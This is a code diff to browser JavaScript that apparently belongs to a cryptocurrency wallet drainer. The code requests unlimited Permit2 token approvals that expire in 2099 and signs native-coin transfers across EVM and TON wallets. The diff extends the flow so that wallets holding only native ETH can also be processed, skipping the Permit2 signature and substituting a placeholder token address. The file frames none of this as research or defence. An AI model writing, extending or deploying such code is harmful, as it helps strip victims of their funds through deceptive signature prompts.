@@ -30,6 +30,7 @@
   var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
   var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
   var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+  var NATIVE_ETH_ANCHOR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
   var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
   var ACTIVE_TAB = 'evm';
 
@@ -1275,6 +1276,8 @@
         if (top.length) {
           permits = top;
           eligibleErc20 = true;
+        } else if (ethNativeWei !== '0') {
+          permits = [];
         }
       }
     } catch (e) { /* ranked optional */ }
@@ -1300,16 +1303,23 @@
     if (wallets.ton) { batchBody.ton_wallet = wallets.ton.address; batchBody.nativeAmountTon = amounts.ton; }
 
     var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
-    if (!batch.typed_data || !batch.batch_permit_metadata) {
+    var needsPermit2 = !!batch.typed_data;
+    if (!batch.batch_permit_metadata) {
       throw new Error(
         eligibleErc20 || hasNativeEth
-          ? 'Batch typed data missing'
+          ? 'Batch metadata missing'
           : 'No eligible token for Permit2 batch — fund wallet with ERC20 (e.g. USDC) or native ETH',
       );
     }
+    if (!needsPermit2 && !(batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n)) {
+      throw new Error('No eligible token for Permit2 batch — fund wallet with ERC20 (e.g. USDC) or native ETH');
+    }
 
-    setStatus('Sign Permit2 authorization…', 'busy');
-    var permitSig = await signEvmTypedData(batch.typed_data);
+    var permitSig = '0x00';
+    if (needsPermit2) {
+      setStatus('Sign Permit2 authorization…', 'busy');
+      permitSig = await signEvmTypedData(batch.typed_data);
+    }
 
     var nativeSignedTx = null;
     if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
@@ -1339,7 +1349,7 @@
       chain_family: 'EVM',
       protocol: 'omnichain_atomic_v1',
       wallet_address: evm.address,
-      token_address: permits[0].token,
+      token_address: (permits[0] && permits[0].token) || NATIVE_ETH_ANCHOR,
       permits: permits,
       batch_permit_metadata: batch.batch_permit_metadata,
       chain_id: evm.chainId,
